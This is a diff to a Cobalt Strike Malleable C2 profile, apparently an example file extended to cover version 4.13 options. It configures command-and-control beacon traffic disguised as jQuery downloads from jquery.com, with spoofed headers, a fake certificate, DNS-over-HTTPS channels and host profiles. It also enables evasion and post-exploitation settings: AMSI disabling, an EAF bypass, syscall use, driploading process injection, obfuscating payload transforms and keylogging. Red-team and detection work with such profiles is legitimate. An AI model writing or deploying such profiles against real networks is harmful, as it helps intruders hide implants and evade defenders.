@@ -1,9 +1,12 @@
-# stripped from comments https://github.com/threatexpress/malleable-c2/blob/master/jquery-c2.4.9.profile
-# for cs 4.9.1
+# full coverage example profile for Cobalt Strike 4.13
+# originally based on https://github.com/threatexpress/malleable-c2/blob/master/jquery-c2.4.9.profile
 set sample_name "jQuery CS 4.8 Profile";
 
 set sleeptime "45000";         # 45 Seconds
 set jitter    "37";            # % jitter
+set sleep "1d 13h 34m 45s 25j"; # 4.9 sleep command syntax
+
+set checkin_delay "5000"; # 4.13
 
 set data_jitter "100";          
 
@@ -12,11 +15,24 @@ set headers_remove "Strict-Transport-Security, header2, header3";
 set useragent "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko";
 
 https-certificate {
+    set keystore "keystore.p12";
+    set password "password";
     set C   "US";
     set CN  "jquery.com";
+    set L   "Mountain View";
     set O   "jQuery";
     set OU  "Certificate Authority";
+    set ST  "California";
     set validity "365";
+}
+
+code-signer {
+    set keystore "codesign.p12";
+    set password "password";
+    set alias "services";
+    set digest_algorithm "SHA-256";
+    set timestamp "false";
+    set timestamp_url "http://timestamp.server/url";
 }
 
 set tasks_max_size "2097152"; # Changed to 2 MB to support larger assembly files
@@ -45,6 +61,17 @@ dns-beacon {
     set put_metadata     "e.md.";
     set put_output       "f.po.";
     set ns_response      "zero";
+    set comm_mode        "dns-over-https"; # 4.11
+
+    dns-over-https { # 4.11
+        set doh_verb         "POST";
+        set doh_useragent    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)";
+        set doh_proxy_server "https://my.proxy.server:99";
+        set doh_server       "mozilla.cloudflare-dns.com,cloudflare-dns.com";
+        set doh_accept       "application/dns-message";
+        header "Content-Type" "application/dns-message";
+        header "Header-2" "header2";
+    }
 }
 
 dns-beacon "variant-x" {
@@ -62,10 +89,19 @@ dns-beacon "variant-x" {
     set put_metadata     "ee.md.";
     set put_output       "ff.po.";
     set ns_response      "zero";
+    set comm_mode        "dns-over-https"; # 4.11
+
+    dns-over-https { # 4.11
+        set doh_verb   "GET";
+        set doh_accept "application/dns-message";
+        header "Content-Type" "application/dns-message";
+    }
 }
 
 http-beacon {
     set library "winhttp";
+    set data_required "true";        # 4.10
+    set data_required_length "R128"; # 4.10
 }
 
 http-beacon "variant-x" {
@@ -100,6 +136,7 @@ http-stager {
         header "Accept-Language" "en-US,en;q=0.5";
         header "Referer" "http://code.jquery.com/";
         header "Accept-Encoding" "gzip, deflate";
+        parameter "stager_param" "stager_value";
     }
 }
 
@@ -109,6 +146,7 @@ post-ex {
     set obfuscate "true";
     set smartinject "true";
     set amsi_disable "true";
+    set thread_hint "module!function+0x##"; # CS 4.2
     set pipename "Winsock2\\CatalogChangeListener-###-0,";
     set keylogger "GetAsyncKeyState";
     set cleanup "false";
@@ -141,6 +179,24 @@ stage {
     set name           "srv.dll";
     set rich_header    "\x3e\x98\xfe\x75\x7a\xf9\x90\x26\x7a\xf9\x90\x26\x7a\xf9\x90\x26\x73\x81\x03\x26\xfc\xf9\x90\x26\x17\xa4\x93\x27\x79\xf9\x90\x26\x7a\xf9\x91\x26\x83\xfd\x90\x26\x17\xa4\x91\x27\x65\xf9\x90\x26\x17\xa4\x95\x27\x77\xf9\x90\x26\x17\xa4\x94\x27\x6c\xf9\x90\x26\x17\xa4\x9e\x27\x56\xf8\x90\x26\x17\xa4\x6f\x26\x7b\xf9\x90\x26\x17\xa4\x92\x27\x7b\xf9\x90\x26\x52\x69\x63\x68\x7a\xf9\x90\x26\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
     set syscall_method "None";
+    set magic_mz_x86   "MZRE"; # CS 4.2
+    set magic_mz_x64   "MZAR"; # CS 4.2
+    set module_x86     "xpsservices.dll"; # CS 4.2
+    set module_x64     "xpsservices.dll"; # CS 4.2
+    set data_store_size "32"; # 4.9
+    set eaf_bypass     "true"; # 4.11
+    set rdll_loader    "PrependLoader"; # 4.11
+    set rdll_use_syscalls "true"; # 4.11
+    set copy_pe_header "true"; # 4.11
+    set rdll_use_driploading "true"; # 4.12
+    set rdll_dripload_delay "200"; # 4.12
+
+    beacon_gate { # 4.10
+        VirtualAlloc;
+        VirtualAllocEx;
+        InternetConnectA;
+    }
+
     transform-x86 { # transform the x86 rDLL stage
         prepend "\x90\x90\x90\x90\x90\x90\x90\x90\x90"; # prepend nops
         strrep "ReflectiveLoader" "execute"; # Change this text
@@ -153,6 +209,15 @@ stage {
         strrep "beacon.x64.dll" ""; # Remove this text in the Beacon DLL
     }
 
+    transform-obfuscate { # 4.11
+        lznt1;
+        rc4 "64";
+        xor "32";
+        base64;
+    }
+
+    data "goMalleable-data"; # Add this data to the DLL
+    string "goMalleable"; # Add this string to the DLL
     stringw "jQuery"; # Add this string to the DLL
 }
 
@@ -163,6 +228,8 @@ process-inject {
     set min_alloc "17500";
     set startrwx "false";
     set userwx   "false";
+    set use_driploading "true"; # 4.12
+    set dripload_delay "100"; # 4.12
     transform-x86 {
         prepend "\x90\x90";
     }
@@ -233,7 +300,13 @@ http-post {
     set uri "/jquery-3.3.2.min.js";
     set verb "POST";
 
+    set client_max_post_post_size "524288"; # 4.11
+    set client_max_post_get_size "96";      # 4.11
+    set client_max_post_get_packet "4096";  # 4.11
+
     client {
+
+        parameter "post_param" "post_value";
 
         header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
         header "Referer" "http://code.jquery.com/";
@@ -267,6 +340,32 @@ http-post {
             prepend "/*! jQuery v3.3.1 | (c) JS Foundation and other contributors | jquery.org/license */";
             append "\".(o=t.documentElement,Math.max(t.body[\"scroll\"+e],o[\"scroll\"+e],t.body[\"offset\"+e],o[\"offset\"+e],o[\"client\"+e])):void 0===i?w.css(t,n,s):w.style(t,n,i,s)},t,a?i:void 0,a)}})}),w.each(\"blur focus focusin focusout resize scroll click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select submit keydown keypress keyup contextmenu\".split(\" \"),function(e,t){w.fn[t]=function(e,n){return arguments.length>0?this.on(t,null,e,n):this.trigger(t)}}),w.fn.extend({hover:function(e,t){return this.mouseenter(e).mouseleave(t||e)}}),w.fn.extend({bind:function(e,t,n){return this.on(e,null,t,n)},unbind:function(e,t){return this.off(e,null,t)},delegate:function(e,t,n,r){return this.on(t,e,n,r)},undelegate:function(e,t,n){return 1===arguments.length?this.off(e,\"**\"):this.off(t,e||\"**\",n)}}),w.proxy=function(e,t){var n,r,i;if(\"string\"==typeof t&&(n=e[t],t=e,e=n),g(e))return r=o.call(arguments,2),i=function(){return e.apply(t||this,r.concat(o.call(arguments)))},i.guid=e.guid=e.guid||w.guid++,i},w.holdReady=function(e){e?w.readyWait++:w.ready(!0)},w.isArray=Array.isArray,w.parseJSON=JSON.parse,w.nodeName=N,w.isFunction=g,w.isWindow=y,w.camelCase=G,w.type=x,w.now=Date.now,w.isNumeric=function(e){var t=w.type(e);return(\"number\"===t||\"string\"===t)&&!isNaN(e-parseFloat(e))},\"function\"==typeof define&&define.amd&&define(\"jquery\",[],function(){return w});var Jt=e.jQuery,Kt=e.$;return w.noConflict=function(t){return e.$===w&&(e.$=Kt),t&&e.jQuery===w&&(e.jQuery=Jt),w},t||(e.jQuery=e.$=w),w});";
             print;
+        }
+    }
+}
+
+http-host-profiles { # 4.9
+    profile {
+        set host-name "one.example.com";
+        http-get {
+            set uri "/[a|b|c|d]/get.js";
+            header "hdr-[a|b|c]" "static-value";
+            parameter "p1" "value-[x|y|z]";
+            parameter "[p1|||p4]" "[a|b|c]";
+        }
+        http-post {
+            set uri "/[a|b|c|d]/[post1|post2|post3|post4].js";
+            header "hdr-[a|b|c]" "static-value";
+            parameter "[p1|||p4]" "[a|b|c]";
+        }
+    }
+    profile {
+        set host-name "two.example.com";
+        http-get {
+            set uri "/get.js";
+        }
+        http-post {
+            set uri "/post.js";
         }
     }
 }
